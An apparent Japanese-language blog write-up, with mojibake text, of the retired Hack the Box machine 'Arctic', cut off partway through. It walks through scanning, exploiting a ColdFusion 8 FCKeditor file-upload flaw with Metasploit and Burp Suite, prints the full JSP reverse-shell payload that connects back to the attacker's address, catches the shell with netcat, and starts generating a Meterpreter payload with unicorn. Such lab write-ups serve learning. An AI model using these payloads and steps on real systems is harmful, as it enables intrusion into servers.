---
title: "ã€Hack the Box write-upã€‘Arctic"
date:  "2020-02-20T15:04:05+07:00"
author:
  - "ã•ã‚“ã½ã—"
draft: false
tags: ["writeup","Hack the Box"]
categories:
  - "security"
---

åƒ•ã«ã¨ã£ã¦åˆã‚ã¦æŒ‘æˆ¦ã™ã‚‹ Hack the Box ã® machine ã§ã™ã€‚

èª¬æ˜ã‚¬ãƒã‚¬ãƒãªéƒ¨åˆ†ã‚‚ã‚ã‚‹ã¨æ€ã„ã¾ã™ãŒã‚¢ãƒ‰ãƒã‚¤ã‚¹ã‚„è¨‚æ­£ãŒã‚ã£ãŸã‚‰ãœã²ãœã²ã‚³ãƒ¡ãƒ³ãƒˆã«ãŠé¡˜ã„ã—ã¾ã™ã€‚

ä»Šå›æŒ‘æˆ¦ã™ã‚‹ Arctic ã¯ã™ã§ã« retired ã•ã‚Œã¦ã„ã‚‹ machine ãªã®ã§[å…¬å¼ã®write-through](https://www.youtube.com/watch?time_continue=31&v=e9lVyFH7-4o&feature=emb_title)ãŒ Youtube ã§å…¬é–‹ã•ã‚Œã¦ã„ã¾ã™ã€‚
ã“ã¡ã‚‰ã‚’å‚è€ƒã«ã—ã¦é€²ã‚ã¦ã„ãã¾ã™ã€‚

## cheat sheet

ä»¥ä¸‹ã§ cheat sheet ã¨ã—ã¦ãƒ„ãƒ¼ãƒ«ã®ä½¿ã„æ–¹ãªã©ã‚’ã¾ã¨ã‚ã¦ã„ã¾ã™ã€‚å‚è€ƒã«ã—ã¦ãã ã•ã„ã€‚
[github | sanposhiho/MY_CHEAT_SHEET](https://github.com/sanposhiho/MY_CHEAT_SHEET)

## machineã«ã¤ã„ã¦
é›£æ˜“åº¦ã¯ easy ã§ã™ã€‚
![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2020-02-22 18.18.51.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/9eb6348b-8267-7b96-71b7-37c156ef8df9.png)


## nmapã§ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³
```
kali@kali:~$ nmap -Pn -A 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 00:36 EST
Nmap scan report for 10.10.10.11
Host is up (0.20s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.32 seconds

```

### ä½¿ç”¨ã—ãŸnmapã®å„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦
[Nampã‚¹ã‚­ãƒ£ãƒ³ã®å…¨ã‚³ãƒãƒ³ãƒ‰ãƒ»ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æ—¥æœ¬èªè§£èª¬|ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¼ã¯Nmapã§æŠ‘ãˆã‚ˆã†](https://at-virtual.net/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/namp%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%81%AE%E5%85%A8%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%BB%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E6%97%A5%E6%9C%AC%E8%AA%9E%E8%A7%A3/)

```
-Pn : ICMPã®ã¿ã§ãªã80,443ç•ªãƒãƒ¼ãƒˆã«ã‚‚TCPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ã‚Šã€åŒã‚»ã‚°ãƒ¡ãƒ³ãƒˆã§ã¯ARPã‚‚é€ä¿¡ã—ãƒ›ã‚¹ãƒˆã®å­˜åœ¨ã‚’åˆ¤æ–­
-A : OSã®ç¨®é¡ã¨ãã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æ¤œçŸ¥
```

### ICMPã¨ã¯
é€šå¸¸ nmap ã¯ã‚¹ã‚­ãƒ£ãƒ³ã®å‰ã« ping ã§ã®ç–é€šç¢ºèªã‚’è¡Œã£ã¦ã„ã‚‹ãã†ã§ã™ã€‚ICMP ã¨ã¯ ping ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ãŸéš›ã«ç”¨ã„ã‚‰ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã ãã†ã§ã€‚
[ICMPã¨PINGã‚³ãƒãƒ³ãƒ‰](http://www.picfun.com/lan07a.html)

### ARPã¨ã¯
ARP ã¨ã¯ IP ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ MAC ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã‚‹ãŸã‚ã«ç”¨ã„ã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã ãã†ã§ã™ã€‚

## ä¸€æ—¦å…¬å¼ã®write-throughã‚’è¦‹ã‚‹
å…¬å¼ã® write-through ã§ã¯ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ nmap ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã—ãŸã€‚

```
$ nmap -sV -sC -oA nmap 10.10.10.11
```

ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦

```
-sV ãƒãƒ¼ã‚¸ãƒ§ãƒ³æ¤œå‡ºã®ã¿è¡Œã†ï¼ˆ-Aã¯OSã®ç¨®é¡ã¨ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æ¤œå‡ºï¼‰
-sC ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®NSEã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹
-oA å‡ºåŠ›çµæœã‚’ï¼ˆå…¨ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã«ï¼‰å‡ºåŠ›ã™ã‚‹
```

ä»¥ä¸‹ã®å…¬å¼ã®ãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ãŒå‚è€ƒã«ãªã‚Šã¾ã™
[ã‚µãƒ¼ãƒ“ã‚¹ã¨ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®æ¤œå‡º](https://nmap.org/man/ja/man-version-detection.html)
[å‡ºåŠ›](https://nmap.org/man/ja/man-output.html)
[Chapter 9. Nmap Scripting Engine](https://nmap.org/man/ja/man-examples.html)

NSE ã«é–¢ã—ã¦ã¯ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚‚å‚è€ƒã«ãªã‚Šã¾ã™ã€‚
[Nmap Scripting Engine](http://www.byakuya-shobo.co.jp/hj/moh/pdf/moh_p104_p111.pdf)

## ç™ºè¦‹ã—ãŸ8500ç•ªãƒãƒ¼ãƒˆã«ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹
åƒ•ã¯çµæœã‚’ã¿ã¦ã‚‚ã‚ˆãã‚ã‹ã‚‰ãªã„ã®ã§å…¨ã¦ã®ãƒãƒ¼ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¾ã—ãŸã€‚8500 ç•ªãƒãƒ¼ãƒˆã®ã¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

è‰²ã€…ã„ã˜ã£ã¦ã¿ã¦ ` /CFIDE/administrator` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ `Coldfusion8 administrator` ã¨æ›¸ã‹ã‚ŒãŸãƒšãƒ¼ã‚¸ãŒç¾ã‚Œã¾ã™ã€‚

## Coldfusionã®exploitã‚’æ¢ã™
`searchsploit`ã‚³ãƒãƒ³ãƒ‰ã§ Coldfusion8 ã® exploit ã‚’æ¢ã—ã¾ã™ã€‚

```
kali@kali:~$ searchsploit coldfusion
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                        |  Path
                                                                                                                                      | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                   | exploits/cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                | exploits/multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                   | exploits/multiple/remote/16985.rb
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                         | exploits/multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                     | exploits/cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                    | exploits/cfm/webapps/36172.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                             | exploits/windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                | exploits/multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                       | exploits/multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                             | exploits/multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                          | exploits/cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                       | exploits/cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                | exploits/cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                 | exploits/cfm/webapps/33168.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                           | exploits/windows/remote/43993.py
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                   | exploits/multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                         | exploits/windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                                                | exploits/multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                     | exploits/cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                                               | exploits/multiple/webapps/25305.py
ColdFusion MX - Missing Template Cross-Site Scripting                                                                                 | exploits/cfm/remote/21548.txt
ColdFusion MX - Remote Development Service                                                                                            | exploits/windows/remote/50.pl
ColdFusion Scripts Red_Reservations - Database Disclosure                                                                             | exploits/asp/webapps/7440.txt
ColdFusion Server 2.0/3.x/4.x - Administrator Login Password Denial of Service                                                        | exploits/multiple/dos/19996.txt
Macromedia ColdFusion MX 6.0 - Error Message Full Path Disclosure                                                                     | exploits/cfm/webapps/22544.txt
Macromedia ColdFusion MX 6.0 - Oversized Error Message Denial of Service                                                              | exploits/multiple/dos/24013.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                                             | exploits/multiple/remote/22867.pl
Macromedia ColdFusion MX 6.0 - SQL Error Message Cross-Site Scripting                                                                 | exploits/cfm/webapps/23256.txt
Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                                                 | exploits/multiple/remote/24654.txt
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

version 8 ã‚’æŠœãå‡ºã™ã¨

```
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                          | exploits/cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                       | exploits/cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                | exploits/cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                 | exploits/cfm/webapps/33168.txt

ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                     | exploits/cfm/webapps/16788.rb
```
`File Upload`ã®ã‚„ã¤ã‚’ä½¿ã„ã¾ã™

## Metasploitã§é ‘å¼µã‚‹

```
msf5 > search coldfusion

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank       Check  Description
   -  ----                                                           ---------------  ----       -----  -----------
   0  auxiliary/gather/coldfusion_pwd_props                          2013-05-07       normal     Yes    ColdFusion 'password.properties' Hash Extraction
   1  auxiliary/scanner/http/adobe_xml_inject                                         normal     No     Adobe XML External Entity Injection
   2  auxiliary/scanner/http/coldfusion_locale_traversal                              normal     No     ColdFusion Server Check
   3  auxiliary/scanner/http/coldfusion_version                                       normal     No     ColdFusion Version Scanner
   4  exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce  2016-03-28       excellent  Yes    HID discoveryd command_blink_on Unauthenticated RCE
   5  exploit/multi/http/coldfusion_ckeditor_file_upload             2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload
   6  exploit/multi/http/coldfusion_rds_auth_bypass                  2013-08-08       great      Yes    Adobe ColdFusion RDS Authentication Bypass
   7  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute


msf5 > use exploit/windows/http/coldfusion_fckeditor
msf5 exploit(windows/http/coldfusion_fckeditor) > show options

Module options (exploit/windows/http/coldfusion_fckeditor):

   Name           Current Setting                                                             Required  Description
   ----           ---------------                                                             --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm 
   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80                                                                          yes       The target port (TCP)
   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Universal Windows Target


msf5 exploit(windows/http/coldfusion_fckeditor) > set RHOSTS 10.10.10.11
RHOSTS => 10.10.10.11
msf5 exploit(windows/http/coldfusion_fckeditor) > set RPORT 8500
RPORT => 8500
msf5 exploit(windows/http/coldfusion_fckeditor) > run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
```

å…ˆã»ã©ã® exploit ã‚’ä½¿ç”¨ã—ã¦æ™®é€šã«ã‚„ã£ã¦ã¿ã¦ã‚‚å¤±æ•—ã—ã¾ã™ã€‚

## advance optionã‚’ã„ã˜ã‚‹

```
msf5 exploit(windows/http/coldfusion_fckeditor) > show advanced option

Module advanced options (exploit/windows/http/coldfusion_fckeditor):

   Name                    Current Setting                                     Required  Description
   ----                    ---------------                                     --------  -----------
   ContextInformationFile                                                      no        The information file that contains context information
   DOMAIN                  WORKSTATION                                         yes       The domain to use for windows authentification
   DigestAuthIIS           true                                                no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers
   DisablePayloadHandler   false                                               no        Disable the handler code for the selected payload
   EnableContextEncoding   false                                               no        Use transient context when encoding payloads
   FingerprintCheck        true                                                no        Conduct a pre-exploit fingerprint verification
   HttpClientTimeout                                                           no        HTTP connection and receive timeout
   HttpPartialResponses    false                                               no        Return partial HTTP responses despite timeouts
   HttpPassword                                                                no        The HTTP password to specify for authentication
   HttpRawHeaders                                                              no        Path to ERB-templatized raw headers to append to existing headers
   HttpTrace               false                                               no        Show the raw HTTP requests and responses
   HttpUsername                                                                no        The HTTP username to specify for authentication
   SSLVersion              Auto                                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  no        The User-Agent header to use for all requests
   VERBOSE                 false                                               no        Enable detailed status messages
   WORKSPACE                                                                   no        Specify the workspace for this module
   WfsDelay                0                                                   no        Additional delay when waiting for a session


Payload advanced options (generic/shell_reverse_tcp):

   Name                        Current Setting  Required  Description
   ----                        ---------------  --------  -----------
   ARCH                                         no        The architecture that is being targeted
   PLATFORM                                     no        The platform that is being targeted
   ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
   ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system
   ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                          no        The specific communication channel to use for this listener
   ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)
   StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                     false            no        Enable detailed status messages
   WORKSPACE                                    no        Specify the workspace for this module

[-] Invalid parameter "option", use "show -h" for more information
msf5 exploit(windows/http/coldfusion_fckeditor) > set VERBOSE true
VERBOSE => true
msf5 exploit(windows/http/coldfusion_fckeditor) > run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
```
VERBOSE ã‚’ true ã«å¤‰æ›´ã—ã¦ã¿ã¾ã—ãŸãŒã€å‡ºåŠ›ã¯å¤‰ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚

## Burp Suite
Burp Suite ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å†…å®¹ã‚’ã¿ã¦åŸå› ã‚’æ¢ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã®ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚

![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2020-02-16 21.17.52.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/36fd5cf3-9985-b8c3-9d5c-f8d72ae52d89.png)
![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2020-02-16 21.17.58.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/0d818747-e392-7cb1-a50d-662d94433330.png)

ã“ã‚Œã«ã‚ˆã‚Š localhost:8500 ã«æ¥ãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ Burp Suite ã«ã‚ˆã£ã¦ 10.10.10.11:8500 ã« redirect ã•ã‚Œã¾ã™ã€‚

## å†åº¦ãƒãƒ£ãƒ¬ãƒ³ã‚¸
intercept ãŒ on ãªã“ã¨ã‚’ç¢ºèªã—ã¦ã‹ã‚‰ã€
![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2020-02-16 21.35.23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/8b9c9a05-9dc7-71f7-3ef8-c5f1d6b2c1ef.png)

exploit ã®å‘ãã‚’ localhost:8500 ã«å¤‰æ›´ã—ã€run ã—ã¾ã™ã€‚

```
msf5 exploit(windows/http/coldfusion_fckeditor) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf5 exploit(windows/http/coldfusion_fckeditor) > run
```

åŒæ§˜ã«å¤±æ•—ã—ã¾ã™ãŒã€Burp Suite ã§ãã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒƒãƒã—ã¾ã™ã€‚
Repeater ã‚’ä½¿ç”¨ã—ã¦ã‚­ãƒ£ãƒƒãƒã—ãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼ˆrun ã«ã‚ˆã£ã¦é€ä¿¡ã•ã‚ŒãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼‰ã‚’å†åº¦ Burp Suite ã‚’ä½¿ã£ã¦é€ä¿¡ã—ã¾ã™ã€‚

![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2020-02-16 21.38.44.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/fb67d963-a69e-c996-813f-9bdfa5d0e7ac.png)

ã™ã‚‹ã¨æˆåŠŸã—ã¾ã™ã€‚

â€»ã“ã“æœªã ã«è¬ãƒã‚¤ãƒ³ãƒˆã§ã™ã€‚
ä½•æ•… Metasploit ã§ã¯å¤±æ•—ã—ãŸã®ã« Burp Suite ã‚’ä½¿ã†ã¨æˆåŠŸã™ã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ
åƒ•ãªã‚Šã«ã¯
Metasploit ã§ã¯ä¸€å®šã®æ™‚é–“ response ãŒç„¡ã„ã¨å¤±æ•—ã¨è¦‹ãªã•ã‚Œã‚‹ã€‚ä»Šå›ã¯ä¸€åº¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒå¸°ã£ã¦ãã‚‹ã¾ã§ã«æš«ãã®æ™‚é–“ãŒã‹ã‹ã‚‹ã®ã§å¤±æ•—ã¨ãªã£ãŸã€‚
ã¨ã„ã†ã“ã¨ãªã®ã‹ãªã¨æ€ã„ã¾ã—ãŸãŒã€ã©ã†ãªã‚“ã§ã—ã‚‡ã†ã‹ã€‚
ï¼ˆåˆ†ã‹ã‚‹æ–¹ã„ã‚‰ã£ã—ã‚ƒã„ã¾ã—ãŸã‚‰ã‚³ãƒ¡ãƒ³ãƒˆãŠé¡˜ã„ã—ã¾ã™ğŸ™‡â€â™‚ï¸ï¼‰

## ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ä½•ãŒé€ã‚‰ã‚Œã¦ã„ã‚‹ã‹ã‚’è¦‹ã‚‹
run ã§ä½•ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã•ã‚Œã¦ã„ã‚‹ã®ã‹ã‚’ã¿ã¦ã¿ã¾ã™ã€‚

```
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/Y.jsp%00 HTTP/1.1
Host: 127.0.0.1:8500
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_387_507016430_1561099465
Content-Length: 1585
Connection: close

--_Part_387_507016430_1561099465
Content-Disposition: form-data; name="newfile"; filename="QNAXOXFN.txt"
Content-Type: application/x-java-archive

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream sq;
    OutputStream ab;

    StreamConnector( InputStream sq, OutputStream ab )
    {
      this.sq = sq;
      this.ab = ab;
    }

    public void run()
    {
      BufferedReader ek  = null;
      BufferedWriter hnb = null;
      try
      {
        ek  = new BufferedReader( new InputStreamReader( this.sq ) );
        hnb = new BufferedWriter( new OutputStreamWriter( this.ab ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ek.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hnb.write( buffer, 0, length );
          hnb.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ek != null )
          ek.close();
        if( hnb != null )
          hnb.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath = "cmd.exe";
    Socket socket = new Socket( "10.10.14.2", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--_Part_387_507016430_1561099465--
```

`CurrentFolder=/Y.jsp%00`ã¨ãªã£ã¦ã„ã¦æœ€å¾Œã« null byte ãŒå…¥ã£ã¦ã„ã‚‹ã“ã¨ã§ CurrentFolder ã®ãƒã‚§ãƒƒã‚¯ã‚’ã‹ã„ããã£ã¦ã„ã‚‹ã¨ã„ã†èªè­˜ã§å¤§ä¸ˆå¤«ã§ã™ã‹ã­ï¼Ÿ
ï¼ˆã“ã“ã‚‚ç†è§£ãŒæ€ªã—ã„ï¼‰

ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸­èº«ã«ã‚ˆã‚Š `10.10.14.2:4444` ã§å¾…ã¡å—ã‘ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã§ããã†ã§ã™

## uploadã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œ
ã¾ãšã€nc ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ã£ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å¾…ã¡å—ã‘ã¾ã™ã€‚

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

å…ˆã»ã©ã® interrupt ã‚’ off ã«ã—ã¦ã‹ã‚‰
![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2020-02-16 22.57.50.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/6fcf9dfd-cc1f-d5df-970b-13255e011411.png)
ãƒ–ãƒ©ã‚¦ã‚¶ã§å…ˆã»ã© upload ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§å®Ÿè¡Œã—ã¾ã™ã€‚

ã™ã‚‹ã¨

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.11] 49224
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

ã“ã®ã‚ˆã†ã«ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã§ãã¾ã™ã€‚

### ncã‚³ãƒãƒ³ãƒ‰ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦
[Netcatã®ä¾¿åˆ©ãªæ©Ÿèƒ½ã«ã¤ã„ã¦](https://medium.com/yuikuras-cracking-lab/netcat%E3%81%AE%E4%BE%BF%E5%88%A9%E3%81%AA%E6%A9%9F%E8%83%BD%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6-c7598145282d)

```
-n:DNSã«ã‚ˆã‚‹åå‰è§£æ±ºã‚’è¡Œã‚ãªã„
-l:ãƒªãƒƒã‚¹ãƒ³ãƒ¢ãƒ¼ãƒ‰
-v:æ¨™æº–ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®å‡ºåŠ›
-p:ãƒãƒ¼ãƒˆã®æŒ‡å®š
```

## Meterpreterã‚’åˆ©ç”¨ã—ãŸã„
[unicorn](https://github.com/trustedsec/unicorn)ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
ï¼ˆKali Linux ã«ã¯ãƒ‡ãƒ•ã‚©ã§ã¯å…¥ã£ã¦ã„ãªã„ã‚ˆã†ãªã®ã§åƒ•ã¯ github ã‹ã‚‰è½ã¨ã—ã¾ã—ãŸï¼‰

unicorn ã¯ PowerShell ã®ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰æ”»æ’ƒã‚’åˆ©ç”¨ã—ã¦ä½•ã‹ã‚’ã‚ˆã—ãªã«ã‚„ã£ã¦ãã‚Œã‚‹ãƒ„ãƒ¼ãƒ«ã ãã†ã§ã™ã€‚ï¼ˆã“ã‚Œã‚‚ã‚ã‚“ã¾ã‚Šã‚ã‹ã£ã¦ã„ãªã„ï¼‰

unicorn ã®åˆ©ç”¨æ–¹æ³•ã¯

```
Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
```
ã§ã™ã€‚

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```
kali@kali:~$ unicorn/unicorn.py windows/meterpreter/reverse_tcp 10.10.14.2 31337
```

ã“ã‚Œã«ã‚ˆã£ã¦ 2 ã¤ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚

### ç”Ÿæˆãƒ•ã‚¡ã‚¤ãƒ«ãã®1ï¼šunicorn.rc
```
kali@kali:~$ cat unicorn.rc 
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.2
set LPORT 31337
set ExitOnSession false
set AutoVerifySession false
set AutoSystemInfo false
set AutoLoadStdapi false
exploit -j
```
matesploit å†…ã§ã‚„ã‚‹ã¹ãã“ã¨ã‚’è‰²ã€…æ›¸ã„ã¦ãã‚Œã¦ã„ã¾ã™ã€‚

### ç”Ÿæˆãƒ•ã‚¡ã‚¤ãƒ«ãã®2ï¼špowershell_attack.txt 
```
kali@kali:~$ cat powershell_attack.txt 
